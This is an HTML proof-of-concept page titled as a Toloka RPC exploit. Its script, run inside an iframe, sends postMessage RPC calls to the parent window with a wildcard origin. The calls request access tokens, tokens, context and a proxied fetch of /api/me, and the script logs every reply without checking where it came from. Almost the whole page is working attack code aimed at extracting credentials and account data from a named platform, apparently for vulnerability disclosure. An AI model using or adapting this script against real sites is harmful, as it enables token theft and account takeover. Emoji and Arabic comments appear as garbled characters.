<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>PoC - Toloka RPC Exploit</title>
  <style>
    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
    pre { white-space: pre-wrap; word-break: break-word; }
  </style>
</head>
<body>
  <h2>ğŸ“¡ PoC - RPC via postMessage</h2>
  <pre id="log">â³ Waiting for responses...</pre>

  <script>
    const logEl = document.getElementById('log');
    const log = (...args) => {
      const text = args.map(a => typeof a === 'object' ? JSON.stringify(a, null, 2) : a).join(' ');
      logEl.textContent += '\n' + text;
      console.log(...args);
    };

    // Ø§Ø³ØªÙ‚Ø¨Ù„ ÙƒÙ„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø¨Ø¯ÙˆÙ† ÙÙ„ØªØ±Ø© id Ø£Ùˆ origin
    window.addEventListener('message', e => {
      log('ğŸ“¥ Message from parent:', e.origin, e.data);
    });

    function callRPC(method, payload = {}) {
      const id = crypto.randomUUID();
      window.parent.postMessage({ type: 'rpc', id, name: method, payload }, '*');

      log(`[ğŸ“¤ ${method} Request sent...]`, {
        id,
        payload
      });
    }

    window.onload = () => {
      ['getAccessToken', 'getToken', 'getContext'].forEach(m => callRPC(m));

      // Ø¥Ø¶Ø§ÙØ© /api/me ÙƒÙ€ fetch
      callRPC('fetch', {
        url: '/api/me',
        requestInit: { method: 'GET' }
      });
    };
  </script>
</body>
</html>
